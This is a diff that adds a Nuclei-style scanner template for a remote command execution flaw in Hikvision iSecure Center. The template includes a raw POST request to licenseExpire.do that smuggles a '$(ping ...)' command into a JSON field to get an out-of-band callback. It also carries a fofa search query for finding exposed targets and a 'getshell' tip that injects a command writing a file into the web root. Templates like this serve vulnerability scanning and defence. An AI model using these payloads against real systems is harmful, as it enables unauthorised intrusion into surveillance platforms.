@@ -1,0 +1,33 @@
+id: hikvision-iSecure-Center-licenseExpire-rce
+
+info:
+  name: 海康威视综合安防管理平台 licenseExpire - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0licenseExpire%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/onewinner/POCS/blob/f85e5957a5e8db896a15646ae2ba36d5767d352c/2024HW%E6%BC%8F%E6%B4%9EPOC/HW%E6%9C%9F%E9%97%B4%E6%B5%B7%E5%BA%B7%E5%AE%89%E9%98%B2%E6%BC%8F%E6%B4%9EPOC%E6%95%B4%E7%90%86/Hikvision-iSecure-Cente-licenseExpire-Rce.yaml#L16
+  metadata:
+    verified: true
+    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
+    tips: getshell {"type":"environment","operate":"","machines":{"id":"$(echo Rscan_test > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/360.txt)"}
+  tags: hikvision,rce,iot,oob
+
+http:
+  - raw:
+      - |
+        POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+        {"type":"environment","operate":"","machines":{"id":"$(ping+{{interactsh-url}})"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
